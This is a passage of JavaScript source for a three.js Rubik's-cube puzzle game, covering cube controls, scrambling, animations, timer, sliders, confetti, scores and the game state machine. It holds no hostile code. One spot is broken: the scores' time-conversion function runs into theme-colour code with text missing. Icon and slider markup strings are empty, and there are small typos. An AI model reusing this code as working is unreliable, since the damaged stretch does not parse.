this.game.cube.object.rotation.setFromVector3( this.snapRotation( this.game.cube.object.rotation.toVector3() ) ); this.group.rotation.setFromVector3( this.snapRotation( this.group.rotation.toVector3() ) ); this.deselectLayer( this.flipLayer ); callback( layer ); }, } ); } bounceCube() { let fixDelta = true; return ( progress, delta, rotation ) => { if ( progress >= 1 ) { if ( fixDelta ) { delta = ( progress - 1 ) * rotation; fixDelta = false; } this.game.cube.object.rotateOnAxis( this.flipAxis, delta ); } } } rotateCube( rotation, callback ) { const config = this.flipConfig; const easing = [ Easing.Power.Out( 4 ), Easing.Sine.Out(), Easing.Back.Out( 2 ) ][ config ]; const duration = [ 100, 150, 350 ][ config ]; this.rotationTween = new Tween( { easing: easing, duration: duration, onUpdate: tween => { this.edges.rotateOnWorldAxis( this.flipAxis, tween.delta * rotation ); this.game.cube.object.rotation.copy( this.edges.rotation ); }, onComplete: () => { this.edges.rotation.setFromVector3( this.snapRotation( this.edges.rotation.toVector3() ) ); this.game.cube.object.rotation.copy( this.edges.rotation ); callback(); }, } ); } selectLayer( layer ) { this.group.rotation.set( 0, 0, 0 ); this.movePieces( layer, this.game.cube.object, this.group ); this.flipLayer = layer; } deselectLayer( layer ) { this.movePieces( layer, this.group, this.game.cube.object ); this.flipLayer = null; } movePieces( layer, from, to ) { from.updateMatrixWorld(); to.updateMatrixWorld(); layer.forEach( index => { const piece = this.game.cube.pieces[ index ]; piece.applyMatrix( from.matrixWorld ); from.remove( piece ); piece.applyMatrix( new THREE.Matrix4().getInverse( to.matrixWorld ) ); to.add( piece ); } ); } getLayer( position ) { const layer = []; let axis; if ( position === false ) { axis = this.getMainAxis( this.flipAxis ); position = this.getPiecePosition( this.dragIntersect.object ); } else { axis = this.getMainAxis( position ); } this.game.cube.pieces.forEach( piece => { const piecePosition = this.getPiecePosition( piece ); if ( piecePosition[ axis ] == position[ axis ] ) layer.push( piece.name ); } ); return layer; } getPiecePosition( piece ) { let position = new THREE.Vector3() .setFromMatrixPosition( piece.matrixWorld ) .multiplyScalar( 3 ); return this.game.cube.object.worldToLocal( position.sub( this.game.cube.animator.position ) ).round(); } scrambleCube() { if ( this.scramble == null ) { this.scramble = this.game.scrambler; this.scramble.callback = ( typeof callback !== 'function' ) ? () => {} : callback; } const converted = this.scramble.converted; const move = converted[ 0 ]; const layer = this.getLayer( move.position ); this.flipAxis = new THREE.Vector3(); this.flipAxis[ move.axis ] = 1; this.selectLayer( layer ); this.rotateLayer( move.angle, true, () => { converted.shift(); if ( converted.length > 0 ) { this.scrambleCube(); } else { this.scramble = null; } } ); } getIntersect( position, object, multiple ) { this.raycaster.setFromCamera( this.draggable.convertPosition( position.clone() ), this.game.world.camera ); const intersect = ( multiple ) ? this.raycaster.intersectObjects( object ) : this.raycaster.intersectObject( object ); return ( intersect.length > 0 ) ? intersect[ 0 ] : false; } getMainAxis( vector ) { return Object.keys( vector ).reduce( ( a, b ) => Math.abs( vector[ a ] ) > Math.abs( vector[ b ] ) ? a : b ); } detach( child, parent ) { child.applyMatrix( parent.matrixWorld ); parent.remove( child ); this.game.world.scene.add( child ); } attach( child, parent ) { child.applyMatrix( new THREE.Matrix4().getInverse( parent.matrixWorld ) ); this.game.world.scene.remove( child ); parent.add( child ); } addMomentumPoint( delta ) { const time = Date.now(); this.momentum = this.momentum.filter( moment => time - moment.time < 500 ); if ( delta !== false ) this.momentum.push( { delta, time } ); } getMomentum() { const points = this.momentum.length; const momentum = new THREE.Vector2(); this.addMomentumPoint( false ); this.momentum.forEach( ( point, index ) => { momentum.add( point.delta.multiplyScalar( index / points ) ); } ); return momentum; } roundAngle( angle ) { const round = Math.PI / 2; return Math.sign( angle ) * Math.round( Math.abs( angle) / round ) * round; } snapRotation( angle ) { return angle.set( this.roundAngle( angle.x ), this.roundAngle( angle.y ), this.roundAngle( angle.z ) ); } checkIsSolved() { const start = performance.now(); let solved = true; const sides = { 'x-': [], 'x+': [], 'y-': [], 'y+': [], 'z-': [], 'z+': [] }; this.game.cube.edges.forEach( edge => { const position = edge.parent .localToWorld( edge.position.clone() ) .sub( this.game.cube.object.position ); const mainAxis = this.getMainAxis( position ); const mainSign = position.multiplyScalar( 2 ).round()[ mainAxis ] < 1 ? '-' : '+'; sides[ mainAxis + mainSign ].push( edge.name ); } ); Object.keys( sides ).forEach( side => { if ( ! sides[ side ].every( value => value === sides[ side ][ 0 ] ) ) solved = false; } ); if ( solved ) this.onSolved(); } } class Scrambler { constructor( game ) { this.game = game; this.scrambleLength = 20; this.moves = []; this.conveted = []; this.pring = ''; } scramble( scramble ) { let count = 0; this.moves = ( typeof scramble !== 'undefined' ) ? scramble.split( ' ' ) : []; if ( this.moves.length < 1 ) { const faces = 'UDLRFB'; const modifiers = [ \"\", \"'\", \"2\" ]; const total = ( typeof scramble === 'undefined' ) ? this.scrambleLength : scramble; while ( count < total ) { const move = faces[ Math.floor( Math.random() * 6 ) ] + modifiers[ Math.floor( Math.random() * 3 ) ]; if ( count > 0 && move.charAt( 0 ) == this.moves[ count - 1 ].charAt( 0 ) ) continue; if ( count > 1 && move.charAt( 0 ) == this.moves[ count - 2 ].charAt( 0 ) ) continue; this.moves.push( move ); count ++; } } this.callback = () => {}; this.convert(); this.print = this.moves.join( ' ' ); return this; } convert( moves ) { this.converted = []; this.moves.forEach( move => { const face = move.charAt( 0 ); const modifier = move.charAt( 1 ); const axis = { D: 'y', U: 'y', L: 'x', R: 'x', F: 'z', B: 'z' }[ face ]; const row = { D: -1, U: 1, L: -1, R: 1, F: 1, B: -1 }[ face ]; const position = new THREE.Vector3(); position[ { D: 'y', U: 'y', L: 'x', R: 'x', F: 'z', B: 'z' }[ face ] ] = row; const angle = ( Math.PI / 2 ) * - row * ( ( modifier == \"'\" ) ? - 1 : 1 ); const convertedMove = { position, axis, angle, name: move }; this.converted.push( convertedMove ); if ( modifier == \"2\" ) this.converted.push( convertedMove ); } ); } } class Transition { constructor( game ) { this.game = game; this.tweens = {}; this.durations = {}; this.data = { cubeY: -0.2, cameraZoom: 0.85, }; this.activeTransitions = 0; } init() { this.game.controls.disable(); this.game.cube.object.position.y = this.data.cubeY; this.game.controls.edges.position.y = this.data.cubeY; this.game.cube.animator.position.y = 4; this.game.cube.animator.rotation.x = - Math.PI / 3; this.game.world.camera.zoom = this.data.cameraZoom; this.game.world.camera.updateProjectionMatrix(); this.tweens.buttons = {}; this.tweens.timer = []; this.tweens.title = []; this.tweens.best = []; this.tweens.complete = []; this.tweens.range = []; this.tweens.stats = []; } buttons( show, hide ) { const buttonTween = ( button, show ) => { return new Tween( { target: button.style, duration: 300, easing: show ? Easing.Power.Out( 2 ) : Easing.Power.In( 3 ), from: { opacity: show ? 0 : 1 }, to: { opacity: show ? 1 : 0 }, onUpdate: tween => { const translate = show ? 1 - tween.value : tween.value; button.style.transform = `translate3d(0, ${translate * 1.5}em, 0)`; }, onComplete: () => button.style.pointerEvents = show ? 'all' : 'none' } ); }; hide.forEach( button => this.tweens.buttons[ button ] = buttonTween( this.game.dom.buttons[ button ], false ) ); setTimeout( () => show.forEach( button => { this.tweens.buttons[ button ] = buttonTween( this.game.dom.buttons[ button ], true ); } ), hide ? 500 : 0 ); } cube( show ) { this.activeTransitions++; try { this.tweens.cube.stop(); } catch(e) {} const currentY = this.game.cube.animator.position.y; const currentRotation = this.game.cube.animator.rotation.x; this.tweens.cube = new Tween( { duration: show ? 3000 : 1250, easing: show ? Easing.Elastic.Out( 0.8, 0.6 ) : Easing.Back.In( 1 ), onUpdate: tween => { this.game.cube.animator.position.y = show ? ( 1 - tween.value ) * 4 : currentY + tween.value * 4; this.game.cube.animator.rotation.x = show ? ( 1 - tween.value ) * Math.PI / 3 : currentRotation + tween.value * - Math.PI / 3; } } ); this.durations.cube = show ? 1500 : 1500; setTimeout( () => this.activeTransitions--, this.durations.cube ); } float() { try { this.tweens.float.stop(); } catch(e) {} this.tweens.float = new Tween( { duration: 1500, easing: Easing.Sine.InOut(), yoyo: true, onUpdate: tween => { this.game.cube.holder.position.y = (- 0.02 + tween.value * 0.04); this.game.cube.holder.rotation.x = 0.005 - tween.value * 0.01; this.game.cube.holder.rotation.z = - this.game.cube.holder.rotation.x; this.game.cube.holder.rotation.y = this.game.cube.holder.rotation.x; }, } ); } zoom( play, time ) { this.activeTransitions++; const zoom = ( play ) ? 1 : this.data.cameraZoom; const duration = ( time > 0 ) ? Math.max( time, 1500 ) : 1500; const rotations = ( time > 0 ) ? Math.round( duration / 1500 ) : 1; const easing = Easing.Power.InOut( ( time > 0 ) ? 2 : 3 ); this.tweens.zoom = new Tween( { target: this.game.world.camera, duration: duration, easing: easing, to: { zoom: zoom }, onUpdate: () => { this.game.world.camera.updateProjectionMatrix(); }, } ); this.tweens.rotate = new Tween( { target: this.game.cube.animator.rotation, duration: duration, easing: easing, to: { y: - Math.PI * 2 * rotations }, onComplete: () => { this.game.cube.animator.rotation.y = 0; }, } ); this.durations.zoom = duration; setTimeout( () => this.activeTransitions--, this.durations.zoom ); } elevate( complete ) { this.activeTransitions++; const cubeY = this.tweens.elevate = new Tween( { target: this.game.cube.object.position, duration: complete ? 1500 : 0, easing: Easing.Power.InOut( 3 ), to: { y: complete ? -0.05 : this.data.cubeY } } ); this.durations.elevate = 1500; setTimeout( () => this.activeTransitions--, this.durations.elevate ); } complete( show, best ) { this.activeTransitions++; const text = best ? this.game.dom.texts.best : this.game.dom.texts.complete; if ( text.querySelector( 'span i' ) === null ) text.querySelectorAll( 'span' ).forEach( span => this.splitLetters( span ) ); const letters = text.querySelectorAll( '.icon, i' ); this.flipLetters( best ? 'best' : 'complete', letters, show ); text.style.opacity = 1; const duration = this.durations[ best ? 'best' : 'complete' ]; if ( ! show ) setTimeout( () => this.game.dom.texts.timer.style.transform = '', duration ); setTimeout( () => this.activeTransitions--, duration ); } stats( show ) { if ( show ) this.game.scores.calcStats(); this.activeTransitions++; this.tweens.stats.forEach( tween => { tween.stop(); tween = null; } ); let tweenId = -1; const stats = this.game.dom.stats.querySelectorAll( '.stats' ); const easing = show ? Easing.Power.Out( 2 ) : Easing.Power.In( 3 ); stats.forEach( ( stat, index ) => { const delay = index * ( show ? 80 : 60 ); this.tweens.stats[ tweenId++ ] = new Tween( { delay: delay, duration: 400, easing: easing, onUpdate: tween => { const translate = show ? ( 1 - tween.value ) * 2 : tween.value; const opacity = show ? tween.value : ( 1 - tween.value ); stat.style.transform = `translate3d(0, ${translate}em, 0)`; stat.style.opacity = opacity; } } ); } ); this.durations.stats = 0; setTimeout( () => this.activeTransitions--, this.durations.stats ); } preferences( show ) { this.activeTransitions++; this.tweens.range.forEach( tween => { tween.stop(); tween = null; } ); let tweenId = -1; let listMax = 0; const ranges = this.game.dom.prefs.querySelectorAll( '.range' ); const easing = show ? Easing.Power.Out(2) : Easing.Power.In(3); ranges.forEach( ( range, rangeIndex ) => { const label = range.querySelector( '.range__label' ); const track = range.querySelector( '.range__track-line' ); const handle = range.querySelector( '.range__handle' ); const list = range.querySelectorAll( '.range__list div' ); const delay = rangeIndex * ( show ? 120 : 100 ); label.style.opacity = show ? 0 : 1; track.style.opacity = show ? 0 : 1; handle.style.opacity = show ? 0 : 1; handle.style.pointerEvents = show ? 'all' : 'none'; this.tweens.range[ tweenId++ ] = new Tween( { delay: show ? delay : delay, duration: 400, easing: easing, onUpdate: tween => { const translate = show ? ( 1 - tween.value ) : tween.value; const opacity = show ? tween.value : ( 1 - tween.value ); label.style.transform = `translate3d(0, ${translate}em, 0)`; label.style.opacity = opacity; } } ); this.tweens.range[ tweenId++ ] = new Tween( { delay: show ? delay + 100 : delay, duration: 400, easing: easing, onUpdate: tween => { const translate = show ? ( 1 - tween.value ) : tween.value; const scale = show ? tween.value : ( 1 - tween.value ); const opacity = scale; track.style.transform = `translate3d(0, ${translate}em, 0) scale3d(${scale}, 1, 1)`; track.style.opacity = opacity; } } ); this.tweens.range[ tweenId++ ] = new Tween( { delay: show ? delay + 100 : delay, duration: 400, easing: easing, onUpdate: tween => { const translate = show ? ( 1 - tween.value ) : tween.value; const opacity = 1 - translate; const scale = 0.5 + opacity * 0.5; handle.style.transform = `translate3d(0, ${translate}em, 0) scale3d(${scale}, ${scale}, ${scale})`; handle.style.opacity = opacity; } } ); list.forEach( ( listItem, labelIndex ) => { listItem.style.opacity = show ? 0 : 1; this.tweens.range[ tweenId++ ] = new Tween( { delay: show ? delay + 200 + labelIndex * 50 : delay, duration: 400, easing: easing, onUpdate: tween => { const translate = show ? ( 1 - tween.value ) : tween.value; const opacity = show ? tween.value : ( 1 - tween.value ); listItem.style.transform = `translate3d(0, ${translate}em, 0)`; listItem.style.opacity = opacity; } } ); } ); listMax = list.length > listMax ? list.length - 1 : listMax; range.style.opacity = 1; } ); this.durations.preferences = show ? ( ( ranges.length - 1 ) * 100 ) + 200 + listMax * 50 + 400 : ( ( ranges.length - 1 ) * 100 ) + 400; setTimeout( () => this.activeTransitions--, this.durations.preferences ); } title( show ) { this.activeTransitions++; const title = this.game.dom.texts.title; if ( title.querySelector( 'span i' ) === null ) title.querySelectorAll( 'span' ).forEach( span => this.splitLetters( span ) ); const letters = title.querySelectorAll( 'i' ); this.flipLetters( 'title', letters, show ); title.style.opacity = 1; const note = this.game.dom.texts.note; this.tweens.title[ letters.length ] = new Tween( { target: note.style, easing: Easing.Sine.InOut(), duration: show ? 800 : 400, yoyo: show ? true : null, from: { opacity: show ? 0 : ( parseFloat( getComputedStyle( note ).opacity ) ) }, to: { opacity: show ? 1 : 0 }, } ); setTimeout( () => this.activeTransitions--, this.durations.title ); } timer( show ) { this.activeTransitions++; const timer = this.game.dom.texts.timer; timer.style.opacity = 0; this.game.timer.convert(); this.game.timer.setText(); this.splitLetters( timer ); const letters = timer.querySelectorAll( 'i' ); this.flipLetters( 'timer', letters, show ); timer.style.opacity = 1; setTimeout( () => this.activeTransitions--, this.durations.timer ); } splitLetters( element ) { const text = element.innerHTML; element.innerHTML = ''; text.split( '' ).forEach( letter => { const i = document.createElement( 'i' ); i.innerHTML = letter; element.appendChild( i ); } ); } flipLetters( type, letters, show ) { try { this.tweens[ type ].forEach( tween => tween.stop() ); } catch(e) {} letters.forEach( ( letter, index ) => { letter.style.opacity = show ? 0 : 1; this.tweens[ type ][ index ] = new Tween( { easing: Easing.Sine.Out(), duration: show ? 800 : 400, delay: index * 50, onUpdate: tween => { const rotation = show ? ( 1 - tween.value ) * -80 : tween.value * 80; letter.style.transform = `rotate3d(0, 1, 0, ${rotation}deg)`; letter.style.opacity = show ? tween.value : ( 1 - tween.value ); }, } ); } ); this.durations[ type ] = ( letters.length - 1 ) * 50 + ( show ? 800 : 400 ); } } class Timer extends Animation { constructor( game ) { super( false ); this.game = game; this.reset(); } start( continueGame ) { this.startTime = continueGame ? ( Date.now() - this.deltaTime ) : Date.now(); this.deltaTime = 0; this.converted = this.convert(); super.start(); } reset() { this.startTime = 0; this.currentTime = 0; this.deltaTime = 0; this.converted = '0:00'; } stop() { this.currentTime = Date.now(); this.deltaTime = this.currentTime - this.startTime; this.convert(); super.stop(); return { time: this.converted, millis: this.deltaTime }; } update() { const old = this.converted; this.currentTime = Date.now(); this.deltaTime = this.currentTime - this.startTime; this.convert(); if ( this.converted != old ) { localStorage.setItem( 'theCube_time', this.deltaTime ); this.setText(); } } convert() { const seconds = parseInt( ( this.deltaTime / 1000 ) % 60 ); const minutes = parseInt( ( this.deltaTime / ( 1000 * 60 ) ) ); this.converted = minutes + ':' + ( seconds < 10 ? '0' : '' ) + seconds; } setText() { this.game.dom.texts.timer.innerHTML = this.converted; } } const RangeHTML = [ '', '', '', '', '', '', '', '', ].join( '\\n' ); document.querySelectorAll( 'range' ).forEach( el => { const temp = document.createElement( 'div' ); temp.innerHTML = RangeHTML; const range = temp.querySelector( '.range' ); const rangeLabel = range.querySelector( '.range__label' ); const rangeList = range.querySelector( '.range__list' ); range.setAttribute( 'name', el.getAttribute( 'name' ) ); rangeLabel.innerHTML = el.getAttribute( 'title' ); el.getAttribute( 'list' ).split( ',' ).forEach( listItemText => { const listItem = document.createElement( 'div' ); listItem.innerHTML = listItemText; rangeList.appendChild( listItem ); } ); el.parentNode.replaceChild( range, el ); } ); class Range { constructor( name, options ) { options = Object.assign( { range: [ 0, 1 ], value: 0, step: 0, onUpdate: () => {}, onComplete: () => {}, }, options || {} ); this.element = document.querySelector( '.range[name=\"' + name + '\"]' ); this.track = this.element.querySelector( '.range__track' ); this.handle = this.element.querySelector( '.range__handle' ); this.value = options.value; this.min = options.range[0]; this.max = options.range[1]; this.step = options.step; this.onUpdate = options.onUpdate; this.onComplete = options.onComplete; this.value = this.round( this.limitValue( this.value ) ); this.setHandlePosition(); this.initDraggable(); } initDraggable() { let current; this.draggable = new Draggable( this.handle, { calcDelta: true } ); this.draggable.onDragStart = position => { current = this.positionFromValue( this.value ); this.handle.style.left = current + 'px'; }; this.draggable.onDragMove = position => { current = this.limitPosition( current + position.delta.x ); this.value = this.round( this.valueFromPosition( current ) ); this.setHandlePosition(); this.onUpdate( this.value ); }; this.draggable.onDragEnd = position => { this.onComplete( this.value ); }; } round( value ) { if ( this.step < 1 ) return value; return Math.round( ( value - this.min ) / this.step ) * this.step + this.min; } limitValue( value ) { const max = Math.max( this.max, this.min ); const min = Math.min( this.max, this.min ); return Math.min( Math.max( value, min ), max ); } limitPosition( position ) { return Math.min( Math.max( position, 0 ), this.track.offsetWidth ); } percentsFromValue( value ) { return ( value - this.min ) / ( this.max - this.min ); } valueFromPosition( position ) { return this.min + ( this.max - this.min ) * ( position / this.track.offsetWidth ); } positionFromValue( value ) { return this.percentsFromValue( value ) * this.track.offsetWidth; } setHandlePosition() { this.handle.style.left = this.percentsFromValue( this.value ) * 100 + '%'; } } class Preferences { constructor( game ) { this.game = game; } init() { this.ranges = { flip: new Range( 'flip', { value: this.game.controls.flipConfig, range: [ 0, 2 ], step: 1, onUpdate: value => { this.game.controls.flipConfig = value; }, } ), scramble: new Range( 'scramble', { value: this.game.scrambler.scrambleLength, range: [ 20, 30 ], step: 5, onUpdate: value => { this.game.scrambler.scrambleLength = value; }, } ), fov: new Range( 'fov', { value: this.game.world.fov, range: [ 2, 45 ], onUpdate: value => { this.game.world.fov = value; this.game.world.resize(); }, } ), theme: new Range( 'theme', { value: { cube: 0, erno: 1, dust: 2, camo: 3, rain: 4 }[ this.game.themes.theme ], range: [ 0, 4 ], step: 1, onUpdate: value => { const theme = [ 'cube', 'erno', 'dust', 'camo', 'rain' ][ value ]; this.game.themes.setTheme( theme ); }, } ), }; } } class Confetti { constructor( game ) { this.game = game; this.started = 0; this.options = { speed: { min: 0.0011, max: 0.0022 }, revolution: { min: 0.01, max: 0.05 }, size: { min: 0.1, max: 0.15 }, colors: [ 0x41aac8, 0x82ca38, 0xffef48, 0xef3923, 0xff8c0a ], }; this.geometry = new THREE.PlaneGeometry( 1, 1 ); this.material = new THREE.MeshLambertMaterial( { side: THREE.DoubleSide } ); this.holders = [ new ConfettiStage( this.game, this, 1, 20 ), new ConfettiStage( this.game, this, -1, 30 ), ]; } start() { if ( this.started > 0 ) return; this.holders.forEach( holder => { this.game.world.scene.add( holder.holder ); holder.start(); this.started ++; } ); } stop() { if ( this.started == 0 ) return; this.holders.forEach( holder => { holder.stop( () => { this.game.world.scene.remove( holder.holder ); this.started --; } ); } ); } updateColors( colors ) { this.holders.forEach( holder => { holder.options.colors.forEach( ( color, index ) => { holder.options.colors[ index ] = colors[ [ 'D', 'F', 'R', 'B', 'L' ][ index ] ]; } ); } ); } } class ConfettiStage extends Animation { constructor( game, parent, distance, count ) { super( false ); this.game = game; this.parent = parent; this.distanceFromCube = distance; this.count = count; this.particles = []; this.holder = new THREE.Object3D(); this.holder.rotation.copy( this.game.world.camera.rotation ); this.object = new THREE.Object3D(); this.holder.add( this.object ); this.resizeViewport = this.resizeViewport.bind( this ); this.game.world.onResize.push( this.resizeViewport ); this.resizeViewport(); this.geometry = this.parent.geometry; this.material = this.parent.material; this.options = this.parent.options; let i = this.count; while ( i-- ) this.particles.push( new Particle( this ) ); } start() { this.time = performance.now(); this.playing = true; let i = this.count; while ( i-- ) this.particles[ i ].reset(); super.start(); } stop( callback ) { this.playing = true; this.completed = 0; this.callback = callback; } reset() { super.stop(); this.callback(); } update() { const now = performance.now(); const delta = now - this.time; this.time = now; let i = this.count; while ( i-- ) if ( ! this.particles[ i ].completed ) this.particles[ i ].update( delta ); if ( ! this.playing && this.completed == this.count ) this.reset(); } resizeViewport() { const fovRad = this.game.world.camera.fov * THREE.Math.DEG2RAD; this.height = 2 * Math.tan( fovRad / 2 ) * ( this.game.world.camera.position.length() - this.distanceFromCube ); this.width = this.height * this.game.world.camera.aspect; const scale = 1 / this.game.transition.data.cameraZoom; this.width *= scale; this.height *= scale; this.object.position.z = this.distanceFromCube; this.object.position.y = this.height / 2; } } class Particle { constructor( confetti ) { this.confetti = confetti; this.options = this.confetti.options; this.velocity = new THREE.Vector3(); this.force = new THREE.Vector3(); this.mesh = new THREE.Mesh( this.confetti.geometry, this.confetti.material.clone() ); this.confetti.object.add( this.mesh ); this.size = THREE.Math.randFloat( this.options.size.min, this.options.size.max ); this.mesh.scale.set( this.size, this.size, this.size ); return this; } reset( randomHeight = true ) { this.completed = false; this.color = new THREE.Color( this.options.colors[ Math.floor( Math.random() * this.options.colors.length ) ] ); this.mesh.material.color.set( this.color ); this.speed = THREE.Math.randFloat( this.options.speed.min, this.options.speed.max ) * - 1; this.mesh.position.x = THREE.Math.randFloat( - this.confetti.width / 2, this.confetti.width / 2 ); this.mesh.position.y = ( randomHeight ) ? THREE.Math.randFloat( this.size, this.confetti.height + this.size ) : this.size; this.revolutionSpeed = THREE.Math.randFloat( this.options.revolution.min, this.options.revolution.max ); this.revolutionAxis = [ 'x', 'y', 'z' ][ Math.floor( Math.random() * 3 ) ]; this.mesh.rotation.set( Math.random() * Math.PI / 3, Math.random() * Math.PI / 3, Math.random() * Math.PI / 3 ); } stop() { this.completed = true; this.confetti.completed ++; } update( delta ) { this.mesh.position.y += this.speed * delta; this.mesh.rotation[ this.revolutionAxis ] += this.revolutionSpeed; if ( this.mesh.position.y < - this.confetti.height - this.size ) ( this.confetti.playing ) ? this.reset( false ) : this.stop(); } } class Scores { constructor( game ) { this.game = game; this.scores = []; this.solves = 0; this.best = 0; this.worst = 0; } addScore( time ) { this.scores.push( time ); this.solves++; if ( this.scores.lenght > 100 ) this.scores.shift(); let bestTime = false; if ( time < this.best || this.best === 0 ) { this.best = time; bestTime = true; } if ( time > this.worst ) this.worst = time; return bestTime; } calcStats() { this.setStat( 'total-solves', this.solves ); this.setStat( 'best-time', this.convertTime( this.best ) ); this.setStat( 'worst-time', this.convertTime( this.worst ) ); this.setStat( 'average-5', this.getAverage( 5 ) ); this.setStat( 'average-12', this.getAverage( 12 ) ); this.setStat( 'average-25', this.getAverage( 25 ) ); } setStat( name, value ) { if ( value === 0 ) return; this.game.dom.stats.querySelector( `.stats[name=\"${name}\"] b` ).innerHTML = value; } getAverage( count ) { if ( this.scores.length < count ) return 0; return this.convertTime( this.scores.slice(-count).reduce( ( a, b ) => a + b, 0 ) / count ); } convertTime( time ) { if ( time { edge.material.color.setHex( colors[ edge.name ] ); } ); this.game.dom.rangeHandles.forEach( handle => { handle.style.background = '#' + colors.R.toString(16).padStart(6, '0'); } ); this.game.confetti.updateColors( colors ); this.game.dom.back.style.background = '#' + colors.G.toString(16).padStart(6, '0'); this.game.dom.buttons.pwa.style.color = '#' + colors.R.toString(16).padStart(6, '0'); } } class IconsConverter { constructor( options ) { options = Object.assign( { tagName: 'icon', className: 'icon', styles: false, icons: {}, observe: false, convert: false, }, options || {} ); this.tagName = options.tagName; this.className = options.className; this.icons = options.icons; this.svgTag = document.createElementNS( 'http://www.w3.org/2000/svg', 'svg' ); this.svgTag.setAttribute( 'class', this.className ); if ( options.styles ) this.addStyles(); if ( options.convert ) this.convertAllIcons(); if ( options.observe ) { const MutationObserver = window.MutationObserver || window.WebKitMutationObserver; this.observer = new MutationObserver( mutations => { this.convertAllIcons(); } ); this.observer.observe( document.documentElement, { childList: true, subtree: true } ); } return this; } convertAllIcons() { document.querySelectorAll( this.tagName ).forEach( icon => { this.convertIcon( icon ); } ); } convertIcon( icon ) { const svgData = this.icons[ icon.attributes[0].localName ]; if ( typeof svgData === 'undefined' ) return; const svg = this.svgTag.cloneNode( true ); const viewBox = svgData.viewbox.split( ' ' ); svg.setAttributeNS( null, 'viewBox', svgData.viewbox ); svg.style.width = viewBox[2] / viewBox[3] + 'em'; svg.style.height = '1em'; svg.innerHTML = svgData.content; icon.parentNode.replaceChild( svg, icon ); } addStyles() { const style = document.createElement( 'style' ); style.innerHTML = `.${this.className} { display: inline-block; font-size: inherit; overflow: visible; vertical-align: -0.125em; preserveAspectRatio: none; }`; document.head.appendChild( style ); } } const Icons = new IconsConverter( { icons: { settings: { viewbox: '0 0 512 512', content: '', }, back: { viewbox: '0 0 512 512', content: '', }, trophy: { viewbox: '0 0 576 512', content: '', }, share: { viewbox: '0 0 36 50', content: '', }, pwa: { viewbox: '0 0 740 280', content: '', } }, convert: true, } ); const MENU = 0; const PLAYING = 1; const COMPLETE = 2; const STATS = 3; const PREFS = 4; const SHOW = true; const HIDE = false; class Game { constructor() { const qs = document.querySelector.bind( document ); const qsa = document.querySelectorAll.bind( document ); this.dom = { ui: qs( '.ui' ), game: qs( '.ui__game' ), back: qs( '.ui__background' ), texts: qs( '.ui__texts' ), prefs: qs( '.ui__prefs' ), stats: qs( '.ui__stats' ), texts: { title: qs( '.text--title' ), note: qs( '.text--note' ), timer: qs( '.text--timer' ), stats: qs( '.text--timer' ), complete: qs( '.text--complete' ), best: qs( '.text--best-time' ), }, buttons: { prefs: qs( '.btn--prefs' ), back: qs( '.btn--back' ), stats: qs( '.btn--stats' ), pwa: qs( '.btn--pwa' ), }, rangeHandles: qsa( '.range__handle div' ), }; this.world = new World( this ); this.cube = new Cube( this ); this.controls = new Controls( this ); this.scrambler = new Scrambler( this ); this.transition = new Transition( this ); this.timer = new Timer( this ); this.preferences = new Preferences( this ); this.scores = new Scores( this ); this.storage = new Storage( this ); this.confetti = new Confetti( this ); this.themes = new Themes( this ); this.initActions(); this.state = MENU; this.saved = false; this.newGame = false; this.storage.init(); this.preferences.init(); this.transition.init(); this.scores.calcStats(); setTimeout( () => { this.transition.float(); this.transition.cube( SHOW ); setTimeout( () => this.transition.title( SHOW ), 700 ); setTimeout( () => this.transition.buttons( [ 'prefs', 'pwa' ], [] ), 1000 ); }, 500 ); } initActions() { let tappedTwice = false; this.dom.game.onclick = event => { if ( this.transition.activeTransitions > 0 ) return; if ( this.state === PLAYING ) return; if ( this.state === MENU ) { if ( ! tappedTwice ) { tappedTwice = true; setTimeout( () => tappedTwice = false, 300 ); return false; } if ( ! this.saved ) { this.scrambler.scramble(); this.controls.scrambleCube(); this.newGame = true; } const duration = this.saved ? 0 : this.scrambler.converted.length * this.controls.flipSpeeds[0]; this.state = PLAYING; this.saved = true; this.transition.buttons( [], [ 'pwa', 'prefs' ] ); this.transition.zoom( PLAYING, duration ); this.transition.title( HIDE ); setTimeout( () => { this.transition.timer( SHOW ); this.transition.buttons( [ 'back' ], [] ); }, this.transition.durations.zoom - 1000 ); setTimeout( () => { this.controls.enable(); if ( ! this.newGame ) this.timer.start( true ); }, this.transition.durations.zoom ); } else if ( this.state === COMPLETE ) { this.state = STATS; this.saved = false; this.transition.timer( HIDE ); this.transition.complete( HIDE, this.bestTime ); this.transition.cube( HIDE ); this.timer.reset(); setTimeout( () => { this.cube.reset(); this.confetti.stop(); this.transition.stats( SHOW ); this.transition.elevate( 0 ); }, 1000 ); return false; } else if ( this.state === STATS ) { this.state = MENU; this.transition.buttons( [ 'pwa', 'prefs' ], [] ); this.transition.stats( HIDE ); setTimeout( () => this.transition.cube( SHOW ), 500 ); setTimeout( () => this.transition.title( SHOW ), 1200 ); } }; this.controls.onMove = () => { if ( this.newGame ) { this.timer.start( true ); this.newGame = false; } }; this.dom.buttons.back.onclick = event => { if ( this.transition.activeTransitions > 0 ) return; if ( this.state === PREFS ) { this.state = MENU; this.transition.buttons( [ 'pwa', 'prefs' ], [ 'back' ] ); this.transition.preferences( HIDE ); setTimeout( () => this.transition.cube( SHOW ), 500 ); setTimeout( () => this.transition.title( SHOW ), 1200 ); } else if ( this.state === PLAYING ) { this.state = MENU; this.transition.buttons( [ 'pwa', 'prefs' ], [ 'back' ] ); this.transition.zoom( MENU, 0 ); this.controls.disable(); if ( ! this.newGame ) this.timer.stop(); this.transition.timer( HIDE ); setTimeout( () => this.transition.title( SHOW ), this.transition.durations.zoom - 1000 ); this.playing = false; this.controls.disable(); } }; this.dom.buttons.prefs.onclick = event => { if ( this.transition.activeTransitions > 0 ) return; this.state = PREFS; this.transition.buttons( [ 'back' ], [ 'pwa', 'prefs' ] ); this.transition.title( HIDE ); this.transition.cube( HIDE ); setTimeout( () => this.transition.preferences( SHOW ), 1000 ); }; this.dom.buttons.stats.onclick = event => { if ( this.transition.activeTransitions > 0 ) return; this.state = STATS; this.transition.buttons( [], [ 'pwa', 'prefs' ] ); this.transition.title( HIDE ); this.transition.cube( HIDE ); setTimeout( () => this.transition.stats( SHOW ), 1000 ); }; this.controls.onSolved = () => { this.transition.buttons( [], [ 'back' ] ); this.state = COMPLETE; this.saved = false; this.controls.disable(); this.timer.stop(); this.bestTime = this.scores.addScore( this.timer.deltaTime ); this.transition.zoom( MENU, 0 ); this.transition.elevate( SHOW ); setTimeout( () => { this.transition.complete( SHOW, this.bestTime ); this.confetti.start(); }, 1000 ); }; } } window.game = new 